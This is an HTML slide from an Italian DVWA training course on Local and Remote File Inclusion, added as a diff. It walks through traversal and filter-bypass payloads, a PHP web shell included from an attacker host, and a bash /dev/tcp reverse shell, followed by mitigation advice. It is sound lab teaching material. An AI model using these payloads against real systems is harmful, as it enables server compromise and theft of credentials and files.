@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>04 - File Inclusion | DVWA Cybersecurity Course</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="slide-container">
+
+        <section class="section">
+            <h1>📁 File Inclusion Vulnerabilities</h1>
+            <p class="hero-subtitle">
+                LFI e RFI: includere file locali o remoti per compromettere applicazioni web
+            </p>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">📖 Cos'è la File Inclusion?</h2>
+
+            <div class="card">
+                <h3>Definizione</h3>
+                <p>
+                    Le vulnerabilità di <strong>File Inclusion</strong> si verificano quando un'applicazione
+                    permette agli utenti di specificare quale file caricare, senza validazione adeguata.
+                    Esistono due tipi principali:
+                </p>
+                <ul>
+                    <li><strong>LFI (Local File Inclusion)</strong>: Inclusione di file presenti sul server</li>
+                    <li><strong>RFI (Remote File Inclusion)</strong>: Inclusione di file da server remoti</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Impatto delle Vulnerabilità</h3>
+                <ul>
+                    <li>📄 <strong>Lettura di file sensibili</strong>: /etc/passwd, /etc/shadow, file di configurazione
+                    </li>
+                    <li>💣 <strong>Remote Code Execution</strong>: Esecuzione di codice arbitrario sul server</li>
+                    <li>🔓 <strong>Accesso a credenziali</strong>: Database passwords, API keys</li>
+                    <li>🎯 <strong>Information Disclosure</strong>: Codice sorgente, struttura directory</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-low">Low Security</span> Vulnerabilità e Sfruttamento</h3>
+
+            <div class="alert alert-danger">
+                <strong>⚠️ Vulnerabilità:</strong> Il parametro <code>page</code> nell'URL viene utilizzato
+                direttamente per caricare file senza alcuna validazione.
+            </div>
+
+            <div class="card">
+                <h4>Codice Vulnerabile (Concettuale):</h4>
+                <pre><code>$file = $_GET['page'];
+include($file);</code></pre>
+            </div>
+
+            <h4>🎯 Attacco LFI: Directory Traversal</h4>
+            <div class="card">
+                <p>
+                    Utilizzando la sequenza <code>../</code> possiamo risalire la struttura delle
+                    directory e accedere a file al di fuori della directory web.
+                </p>
+
+                <h4>Payload:</h4>
+                <pre><code>http://target/vulnerabilities/fi/?page=../../../../../../etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione:</h4>
+                        <p>
+                            Ogni <code>../</code> sale di un livello nella gerarchia delle directory.
+                            Ripetendo la sequenza abbastanza volte, raggiungiamo la root (/) e poi
+                            possiamo accedere a qualsiasi file:
+                        </p>
+                        <ul>
+                            <li><code>/etc/passwd</code> - Lista utenti del sistema</li>
+                            <li><code>/etc/shadow</code> - Password hash (se readable)</li>
+                            <li><code>/var/www/html/config.php</code> - File di configurazione</li>
+                            <li><code>/var/log/apache2/access.log</code> - Log del web server</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Attacco RFI: Remote Code Execution</h4>
+            <div class="card">
+                <p>
+                    Se PHP ha <code>allow_url_include=On</code>, possiamo includere file da server remoti.
+                </p>
+
+                <h4>Procedura:</h4>
+                <ol>
+                    <li>Creare file malevolo sul nostro server:
+                        <pre><code>// shell.php
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                    </li>
+                    <li>Avviare server HTTP:
+                        <pre><code>python3 -m http.server 8000</code></pre>
+                    </li>
+                    <li>Includere il file remoto:
+                        <pre><code>http://target/vulnerabilities/fi/?page=http://192.168.1.100:8000/shell.php</code></pre>
+                    </li>
+                    <li>Eseguire comandi:
+                        <pre><code>http://target/vulnerabilities/fi/?page=http://192.168.1.100:8000/shell.php&cmd=whoami</code></pre>
+                    </li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Ottenere una Reverse Shell:</h4>
+                        <pre><code>// Listener sulla macchina attaccante
+nc -lvnp 4444
+
+// Payload nel file remoto
+&lt;?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"); ?&gt;</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-medium">Medium Security</span> Protezioni Implementate</h3>
+
+            <div class="alert alert-warning">
+                <strong>🛡️ Nuove Difese:</strong> Uso di <code>str_replace()</code> per rimuovere
+                <code>http://</code>, <code>https://</code>, <code>../</code> e <code>..\</code>
+            </div>
+
+            <div class="card">
+                <h4>Codice di Protezione:</h4>
+                <pre><code>$file = $_GET['page'];
+$file = str_replace(array("http://", "https://"), "", $file);
+$file = str_replace(array("../", "..\\"), "", $file);
+include($file);</code></pre>
+            </div>
+
+            <h4>🎯 Bypass LFI: Nested Encoding</h4>
+            <div class="card">
+                <p>
+                    La funzione <code>str_replace()</code> esegue una sola passata. Possiamo
+                    annidare i pattern per bypassarla.
+                </p>
+
+                <h4>Payload:</h4>
+                <pre><code>..././..././..././..././..././..././etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Come Funziona:</h4>
+                        <p>
+                            Quando <code>str_replace()</code> rimuove <code>../</code> da <code>..././</code>,
+                            rimane <code>../</code>! La stringa si ricompone nel pattern originale.
+                        </p>
+                        <p>Prima della sostituzione: <code>..././</code><br>
+                            Dopo la sostituzione: <code>../</code> (il pattern centrale viene rimosso)</p>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Bypass RFI: Nested Protocol</h4>
+            <div class="card">
+                <h4>Payload:</h4>
+                <pre><code>hthttp://tp://192.168.1.100:8000/shell.php</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Risultato:</h4>
+                        <p>
+                            <code>str_replace("http://", "", "hthttp://tp://")</code> produce <code>http://</code>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-high">High Security</span> Protezioni Avanzate</h3>
+
+            <div class="alert alert-info">
+                <strong>🛡️ Difese Implementate:</strong> Il file deve iniziare con "file" ed essere "include.php"
+            </div>
+
+            <div class="card">
+                <h4>Codice di Validazione:</h4>
+                <pre><code>$file = $_GET['page'];
+if (!fnmatch("file*", $file) && $file != "include.php") {
+    echo "ERROR: File not found!";
+    exit;
+}
+include($file);</code></pre>
+            </div>
+
+            <h4>🎯 Bypass LFI: File Protocol</h4>
+            <div class="card">
+                <p>Possiamo usare il protocollo <code>file://</code> per leggere file locali:</p>
+
+                <h4>Payload:</h4>
+                <pre><code>file:///etc/passwd</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione:</h4>
+                        <p>
+                            Il payload inizia con "file" (soddisfa la condizione <code>fnmatch("file*", $file)</code>)
+                            e il protocollo <code>file:///</code> permette di accedere a file locali assoluti.
+                        </p>
+                        <p>
+                            ❌ <strong>RFI bloccato</strong>: Non possiamo più usare http:// o https://
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="mitigation-box">
+            <h2>🛡️ Strategie di Mitigazione</h2>
+
+            <div class="card">
+                <h3>1. Evitare Input Utente per File Path</h3>
+                <p>La miglior difesa è NON permettere agli utenti di specificare file da caricare.</p>
+                <pre><code>// INVECE DI QUESTO (vulnerabile)
+$page = $_GET['page'];
+include($page . '.php');
+
+// USA QUESTO (sicuro)
+$allowed_pages = ['home', 'about', 'contact'];
+$page = $_GET['page'] ?? 'home';
+if (in_array($page, $allowed_pages)) {
+    include($page . '.php');
+} else {
+    include('404.php');
+}</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>2. Whitelist di File Permessi</h3>
+                <ul>
+                    <li>Mantenere array di file permessi</li>
+                    <li>Usare mappatura ID → filename invece di filename diretto</li>
+                    <li>Mai permettere path relativi o assoluti dall'utente</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>3. Validazione Rigorosa</h3>
+                <ul>
+                    <li>Usare <code>basename()</code> per rimuovere path</li>
+                    <li>Validare estensione file con whitelist</li>
+                    <li>Verificare che il file esista nella directory permessa</li>
+                    <li>Usare <code>realpath()</code> e verificare che inizi con directory base</li>
+                </ul>
+
+                <pre><code>$base_dir = '/var/www/html/includes/';
+$file = basename($_GET['file']);
+$full_path = realpath($base_dir . $file);
+
+if (strpos($full_path, $base_dir) !== 0) {
+    die('Invalid file path');
+}
+include($full_path);</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>4. Configurazione PHP Sicura</h3>
+                <ul>
+                    <li><code>allow_url_include = Off</code> - Disabilita inclusione URL remoti</li>
+                    <li><code>allow_url_fopen = Off</code> - Se non necessario</li>
+                    <li><code>open_basedir</code> - Limita accesso file a directory specifiche</li>
+                    <li><code>disable_functions</code> - Disabilita funzioni pericolose</li>
+                </ul>
+
+                <pre><code>; php.ini
+allow_url_include = Off
+allow_url_fopen = Off
+open_basedir = /var/www/html/
+disable_functions = exec,passthru,shell_exec,system,proc_open,popen</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>5. Web Application Firewall (WAF)</h3>
+                <ul>
+                    <li>Rilevare pattern di directory traversal (<code>../</code>, <code>..%2f</code>)</li>
+                    <li>Bloccare accesso a file sensibili (/etc/passwd, .env, config.php)</li>
+                    <li>Rate limiting per rilevare scanning automatico</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>6. Principle of Least Privilege</h3>
+                <ul>
+                    <li>Web server con permessi minimi</li>
+                    <li>File sensibili non leggibili dal processo web</li>
+                    <li>Usare SELinux/AppArmor per controllo accessi</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="alert alert-success">
+                <h3>📌 Riepilogo</h3>
+                <p>
+                    Le File Inclusion vulnerabilities permettono di leggere file sensibili o eseguire
+                    codice remoto. La difesa richiede whitelist rigorose, validazione path, e configurazione
+                    PHP sicura. Mai fidarsi dell'input utente per file path!
+                </p>
+            </div>
+        </section>
+
+    </div>
+
+    <div class="nav-container">
+        <button class="nav-btn" id="nav-home" onclick="window.location.href='index.html'">🏠 Home</button>
+        <button class="nav-btn" id="nav-prev" onclick="window.location.href='03_csrf.html'">← Precedente</button>
+        <span class="nav-info" id="progress">5 / 8</span>
+        <button class="nav-btn" id="nav-next" onclick="window.location.href='05_file_upload.html'">Successivo →</button>
+    </div>
+
+    <script src="navigation.js"></script>
+</body>
+
+</html>
